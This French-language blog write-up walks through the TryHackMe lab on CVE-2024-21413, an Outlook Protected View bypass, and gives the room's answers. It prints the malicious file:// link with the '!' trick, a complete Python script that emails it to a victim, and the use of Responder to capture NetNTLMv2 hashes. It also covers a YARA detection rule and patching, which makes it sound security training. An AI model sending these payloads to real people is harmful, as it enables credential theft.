---
title: "TryHackMe - Moniker Link (CVE-2024-21413)"
date: 2025-10-15 00:03:00 +0200
categories: [TryHackMe, Learning]
tags: [moniker-link, cve-2024-21413, microsoft, outlook, exploitation]
description: "Write-up de la room Moniker Link - analyse et exploitation de la CVE-2024-21413 affectant Microsoft Outlook"
image:
  path: /assets/img/posts/tryhackme-moniker-link.png
  alt: "Moniker Link CVE-2024-21413"
---

## Informations sur la room

Room d'introduction aux vulnérabilités de type Moniker Link, avec un focus sur la CVE-2024-21413 affectant Microsoft Outlook.

**Lien :** [Moniker Link Room](https://tryhackme.com/room/monikerlink)

## Objectifs d'apprentissage

Cette room couvre les points suivants :
- Comprendre le fonctionnement de la vulnérabilité CVE-2024-21413
- Analyser le mode "Protected View" d'Outlook et ses limitations
- Exploiter la vulnérabilité pour capturer les identifiants d'un client Outlook
- Mettre en place des mesures de détection et d'atténuation

---

## Solutions des tâches

### Task 1 - Introduction

**What "Severity" rating has the CVE been assigned?**

La page officielle de la CVE est disponible ici : [CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413)

Le niveau de sévérité est clairement indiqué sur la page : **Critical**

**Réponse :** `critical`

### Task 2 - Moniker Link (CVE-2024-21413)

**Principe de la vulnérabilité**

La vulnérabilité exploite les liens hypertextes dans les emails Outlook. Voici un exemple de lien malveillant classique :

```html
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
```

Le protocole `file://` permet de charger un fichier comme s'il provenait d'une ressource réseau. Normalement, le mode "Protected View" d'Outlook détecte et bloque ce type de tentative.

**Contournement du mode protégé**

La CVE-2024-21413 exploite une faiblesse dans la détection du mode protégé. En ajoutant un caractère spécial, il est possible de contourner la protection :

```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

L'ajout du point d'exclamation (`!`) permet de bypasser le "Protected View" d'Outlook, rendant l'attaque possible.

---

**What Moniker Link type do we use in the hyperlink?**

Le protocole utilisé pour charger des fichiers depuis un partage réseau est `file://`.

**Réponse :** `file://`

**What is the special character used to bypass Outlook's "Protected View"?**

Le caractère spécial qui permet de contourner la protection est le point d'exclamation.

**Réponse :** `!`

### Task 3 - Exploitation

**Script d'exploitation**

Le chercheur [CMNatic](https://github.com/CMNatic/CVE-2024-21413) a développé un script Python pour exploiter cette vulnérabilité :

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm'
receiver_email = 'victim@monikerlink.thm'
password = input("Enter your attacker email password: ")

html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()

try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

Ce script permet d'envoyer un email malveillant exploitant la CVE-2024-21413.

**Processus d'exploitation**

1. L'attaquant envoie un email contenant un lien malveillant
2. La victime clique sur le lien contournant le "Protected View"
3. Le système tente de se connecter au partage réseau de l'attaquant
4. L'attaquant capture les identifiants d'authentification réseau

---

**What is the name of the application that we use on the AttackBox to capture the user's hash?**

L'outil utilisé pour écouter et capturer les hash d'authentification réseau est **Responder**.

**Réponse :** `responder`

**What type of hash is captured once the hyperlink in the email has been clicked?**

Lorsque la victime clique sur le lien, son système tente de s'authentifier auprès du serveur de l'attaquant. Le hash capturé est de type **NetNTLMv2**.

> NetNTLMv2 est un protocole d'authentification réseau Windows qui peut être capturé lors de tentatives de connexion SMB et ensuite cracké hors ligne.
{: .prompt-info }

**Réponse :** `netNTLMv2`

### Task 4 - Detection

**Règle YARA**

Le chercheur en sécurité Florian Roth a créé une [règle YARA](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar) pour détecter les emails exploitant cette vulnérabilité :

```py
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
   meta:
      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
      author = "X__Junior, Florian Roth"
      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
      date = "2024-02-17"
      modified = "2024-02-19"
      score = 75
      id = "4512ca7b-0755-565e-84f1-596552949aa5"
   strings:
      $a1 = "Subject: "
      $a2 = "Received: "

      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/
   condition:
      filesize < 1000KB
      and all of ($a*)
      and 1 of ($xr*)
}
```

Cette règle permet d'identifier les emails contenant des patterns caractéristiques de l'exploitation de la CVE-2024-21413.

**Détection réseau avec Wireshark**

Les requêtes SMB (Server Message Block) générées par cette attaque peuvent être facilement détectées et analysées avec Wireshark. Les tentatives de connexion au partage réseau de l'attaquant laissent des traces claires dans le trafic réseau.

> Surveillez particulièrement les connexions SMB sortantes vers des adresses IP inhabituelles ou externes au réseau d'entreprise.
{: .prompt-tip }

### Task 5 - Remediation

**Correctifs Microsoft**

Microsoft a publié des correctifs de sécurité pour cette vulnérabilité. Il est fortement recommandé de mettre à jour les systèmes via Windows Update ou le catalogue Microsoft Update.

**Bonnes pratiques recommandées**

Microsoft préconise les mesures de sécurité suivantes :

1. **Ne jamais cliquer sur des liens non sollicités**, particulièrement dans les emails inattendus
2. **Prévisualiser les URLs** avant de cliquer sur les liens hypertextes
3. **Signaler les emails suspects** au service de sécurité informatique de l'organisation
4. **Maintenir Outlook à jour** via les canaux de mise à jour officiels

> Actuellement, il n'existe aucune solution de contournement permettant d'empêcher totalement le bypass du "Protected View". La mise à jour est donc impérative.
{: .prompt-warning }

## Conclusion

Cette room démontre l'importance critique de maintenir les logiciels à jour, particulièrement pour des applications largement déployées comme Microsoft Outlook.

**Points clés à retenir :**

- La CVE-2024-21413 affecte une grande partie de la suite Microsoft Office
- La simplicité d'exploitation (faible complexité d'attaque) rend cette vulnérabilité particulièrement dangereuse
- L'exploitation permet de capturer des hash NetNTLMv2 exploitables
- La détection peut se faire via des règles YARA et l'analyse du trafic réseau
- La mise à jour est la seule protection efficace contre cette vulnérabilité

Cette vulnérabilité illustre parfaitement comment une petite faille dans un mécanisme de sécurité peut avoir des conséquences importantes sur la sécurité globale d'un système d'information.

---

**Room complétée**

{% include comments.html %}